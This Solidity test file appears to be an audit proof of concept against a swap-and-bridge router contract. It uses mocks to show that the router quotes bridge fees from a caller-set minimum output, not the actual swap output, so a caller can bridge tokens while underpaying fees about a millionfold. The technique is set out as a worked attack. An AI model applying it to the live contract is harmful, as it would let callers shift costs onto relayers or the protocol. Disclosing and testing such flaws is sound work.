// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.29;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { BaseTest } from "./BaseTest.t.sol";
import { TrustSwapAndBridgeRouter } from "contracts/TrustSwapAndBridgeRouter.sol";
import { ISlipstreamSwapRouter } from "contracts/interfaces/external/aerodrome/ISlipstreamSwapRouter.sol";
import { FinalityState } from "src/interfaces/IMetaLayer.sol";

// ---------------------------------------------------------------------------
// Minimal ERC-20 mock (supports initialize for vm.etch reuse)
// ---------------------------------------------------------------------------
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    bool public initialized;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function initialize(string memory _name, string memory _symbol, uint8 _decimals) external {
        require(!initialized, "MockERC20: already initialized");
        initialized = true;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockWETH is MockERC20 {
    constructor() MockERC20("Wrapped Ether", "WETH", 18) { }

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        totalSupply += msg.value;
    }

    receive() external payable {
        deposit();
    }
}

// ---------------------------------------------------------------------------
// Swap router mock: every exactInput call returns amountIn * OUTPUT_MULTIPLIER.
// ---------------------------------------------------------------------------
contract MockSlipstreamSwapRouter {
    uint256 public outputMultiplier;

    constructor(uint256 _outputMultiplier) {
        outputMultiplier = _outputMultiplier;
    }

    function setOutputMultiplier(uint256 multiplier) external {
        outputMultiplier = multiplier;
    }

    function exactInput(ISlipstreamSwapRouter.ExactInputParams calldata params) external returns (uint256 amountOut) {
        amountOut = params.amountIn * outputMultiplier;
        require(amountOut >= params.amountOutMinimum, "MockSwapRouter: too little received");

        bytes calldata path = params.path;
        address tokenIn = address(bytes20(path[:20]));
        address tokenOut = address(bytes20(path[path.length - 20:]));

        IERC20(tokenIn).transferFrom(msg.sender, address(this), params.amountIn);
        MockERC20(tokenOut).mint(params.recipient, amountOut);
    }
}

// ---------------------------------------------------------------------------
// CL factory mock — needed for vm.etch on router.slipstreamFactory()
// ---------------------------------------------------------------------------
contract MockCLFactory {
    mapping(bytes32 => address) internal pools;

    function setPool(address tokenA, address tokenB, int24 tickSpacing, address pool) external {
        pools[_key(tokenA, tokenB, tickSpacing)] = pool;
    }

    function getPool(address tokenA, address tokenB, int24 tickSpacing) external view returns (address) {
        address pool = pools[_key(tokenA, tokenB, tickSpacing)];
        if (pool != address(0)) return pool;
        return pools[_key(tokenB, tokenA, tickSpacing)];
    }

    function _key(address tokenA, address tokenB, int24 tickSpacing) internal pure returns (bytes32) {
        return keccak256(abi.encode(tokenA, tokenB, tickSpacing));
    }
}

// ---------------------------------------------------------------------------
// MetaERC20Hub mock whose fee scales linearly with the bridged amount.
// This makes the fee-to-transfer mismatch numerically visible.
// ---------------------------------------------------------------------------
contract MockMetaERC20Hub {
    /// Fee = amount / FEE_DIVISOR (1 wei per 1e9 units bridged, i.e. ~0.0000001%).
    /// The large divisor makes it easy to observe the 1_000_000x fee discrepancy:
    /// fee(1e12) = 1_000 wei  vs  fee(1e18) = 1_000_000_000 wei.
    uint256 public constant FEE_DIVISOR = 1e9;

    /// Recorded values from the last transferRemote call
    uint256 public lastBridgedAmount;
    uint256 public lastFeePaid;

    function quoteTransferRemote(uint32, bytes32, uint256 amount) external pure returns (uint256) {
        return amount / FEE_DIVISOR;
    }

    function transferRemote(
        uint32,
        bytes32,
        uint256 amount,
        uint256,
        FinalityState
    )
        external
        payable
        returns (bytes32 transferId)
    {
        lastBridgedAmount = amount;
        lastFeePaid = msg.value;
        transferId = keccak256(abi.encodePacked(amount, msg.value, block.timestamp));
    }
}

// ---------------------------------------------------------------------------
// PoC contract
// ---------------------------------------------------------------------------
contract PoCPeriphery is BaseTest {
    // Known Base-mainnet token addresses (used as constants in TrustSwapAndBridgeRouter)
    address internal constant BASE_MAINNET_USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address internal constant BASE_MAINNET_TRUST = 0x6cd905dF2Ed214b22e0d48FF17CD4200C1C6d8A3;
    address payable internal constant BASE_MAINNET_WETH = payable(0x4200000000000000000000000000000000000006);

    int24 internal constant TICK_SPACING_100 = 100;

    /// The mock swap router inflates every output by this factor, simulating a
    /// favourable market that returns far more than the slippage minimum.
    uint256 internal constant OUTPUT_MULTIPLIER = 1e12;

    /// @notice PoC demonstrating the fee-to-transfer mismatch in swapAndBridgeWithERC20.
    ///
    /// Execution trace
    /// ---------------
    ///   Input  : amountIn = 1 USDC  |  minTrustOut = 1e12 TRUST (artificially low)
    ///   State A: bridgeFee = quoteTransferRemote(recipientDomain, recipient, minTrustOut)
    ///            = 1e12 / 1e9 = 1_000 wei  (tiny, based on the floor)
    ///   State B: amountOut = swap(1 USDC) = 1e6 * 1e12 = 1e18 TRUST  (actual output)
    ///   State C: transferRemote(amount = 1e18, value = 1_000 wei)
    ///            — bridges 1e18 TRUST while paying only 1_000 wei in fees,
    ///            instead of the 1e18 / 1e9 = 1e9 wei required for that amount.
    ///
    /// There is NO equivalence check or fee adjustment between State A and State C;
    /// the router blindly forwards `bridgeFee` (quoted from `minTrustOut`) regardless
    /// of what the swap actually produced.
    ///
    /// Impact: Callers can systematically under-pay bridge fees, causing the protocol
    /// or relayers to subsidise cross-chain transfers (insolvency risk) or — if the hub
    /// enforces fee sufficiency — triggering reverts after the irreversible swap step
    /// (stuck-funds risk).
    function test_submissionValidity() external {
        // ------------------------------------------------------------------ //
        // 1. Deploy the router and etch mocks onto its hardcoded addresses    //
        // ------------------------------------------------------------------ //
        TrustSwapAndBridgeRouter router = new TrustSwapAndBridgeRouter();

        // Prepare template contracts whose bytecode we will etch onto the
        // well-known Base mainnet addresses that the router uses.
        MockERC20 erc20Template = new MockERC20("", "", 0);
        MockWETH wethTemplate = new MockWETH();
        MockSlipstreamSwapRouter swapRouterTemplate = new MockSlipstreamSwapRouter(OUTPUT_MULTIPLIER);
        MockCLFactory clFactoryTemplate = new MockCLFactory();
        MockMetaERC20Hub metaHubTemplate = new MockMetaERC20Hub();

        vm.etch(BASE_MAINNET_USDC, address(erc20Template).code);
        vm.etch(BASE_MAINNET_TRUST, address(erc20Template).code);
        vm.etch(BASE_MAINNET_WETH, address(wethTemplate).code);
        vm.etch(router.slipstreamSwapRouter(), address(swapRouterTemplate).code);
        vm.etch(address(router.slipstreamFactory()), address(clFactoryTemplate).code);
        vm.etch(address(router.metaERC20Hub()), address(metaHubTemplate).code);

        MockERC20 usdcToken = MockERC20(BASE_MAINNET_USDC);
        MockMetaERC20Hub metaHub = MockMetaERC20Hub(address(router.metaERC20Hub()));
        MockCLFactory clFactory = MockCLFactory(address(router.slipstreamFactory()));

        // vm.etch copies bytecode only — storage is zeroed. Re-initialise state
        // variables that were set in constructors.
        MockSlipstreamSwapRouter(router.slipstreamSwapRouter()).setOutputMultiplier(OUTPUT_MULTIPLIER);

        // Initialise ERC-20 storage (constructor ran on a different address; etch
        // copies only bytecode so storage is zeroed — re-initialise here).
        usdcToken.initialize("USD Coin", "USDC", 6);
        MockERC20(BASE_MAINNET_TRUST).initialize("Trust Token", "TRUST", 18);

        // Register a pool so any path-validation inside the router can resolve it.
        clFactory.setPool(BASE_MAINNET_USDC, BASE_MAINNET_TRUST, TICK_SPACING_100, address(0xBEEF));

        // Give the test user some USDC.
        address user = makeAddr("user");
        usdcToken.mint(user, 10_000e6);
        vm.prank(user);
        usdcToken.approve(address(router), type(uint256).max);

        // ------------------------------------------------------------------ //
        // 2. Craft the attack: set minTrustOut far below the expected output  //
        // ------------------------------------------------------------------ //
        uint256 amountIn = 1e6; // 1 USDC
        uint256 minTrustOut = 1e12; // artificially low slippage floor

        // Expected output from the mock swap (amountIn * OUTPUT_MULTIPLIER)
        uint256 expectedAmountOut = amountIn * OUTPUT_MULTIPLIER; // 1e18 TRUST

        bytes memory path = abi.encodePacked(BASE_MAINNET_USDC, TICK_SPACING_100, BASE_MAINNET_TRUST);

        // --- STATE A ---
        // The attacker pre-computes the fee the router will charge: it uses minTrustOut.
        uint256 bridgeFeeForMin = metaHub.quoteTransferRemote(
            router.recipientDomain(), bytes32(uint256(uint160(user))), minTrustOut
        );
        // bridgeFeeForMin = 1e12 / 1e9 = 1_000 wei  (tiny)

        // The correct fee for the actual output would be much larger.
        uint256 bridgeFeeForActual = metaHub.quoteTransferRemote(
            router.recipientDomain(), bytes32(uint256(uint160(user))), expectedAmountOut
        );
        // bridgeFeeForActual = 1e18 / 1e9 = 1e9 wei  (1_000_000x more)

        // Confirm the pre-conditions: the attacker pays far less than required.
        assertGt(bridgeFeeForActual, bridgeFeeForMin, "fee(actual) must exceed fee(min)");

        vm.deal(user, bridgeFeeForMin); // user funds only the tiny fee

        // ------------------------------------------------------------------ //
        // 3. Execute the swap-and-bridge — should NOT revert                  //
        // ------------------------------------------------------------------ //
        vm.prank(user);
        (uint256 amountOut,) = router.swapAndBridgeWithERC20{ value: bridgeFeeForMin }(
            BASE_MAINNET_USDC, amountIn, path, minTrustOut, user
        );

        // ------------------------------------------------------------------ //
        // 4. Verify the mismatch                                              //
        // ------------------------------------------------------------------ //

        // --- STATE B ---
        // The swap returned the full expected output.
        assertEq(amountOut, expectedAmountOut, "amountOut must equal expectedAmountOut");

        // --- STATE C ---
        // transferRemote was called with the full amountOut ...
        assertEq(metaHub.lastBridgedAmount(), expectedAmountOut, "bridge amount must be amountOut");
        // ... but only the fee for minTrustOut was forwarded.
        assertEq(metaHub.lastFeePaid(), bridgeFeeForMin, "fee forwarded must equal fee(minTrustOut)");

        // The fee actually paid is 1_000_000x smaller than what the bridged amount requires.
        assertGt(bridgeFeeForActual, metaHub.lastFeePaid(), "fee paid is less than fee required for bridged amount");
    }
}
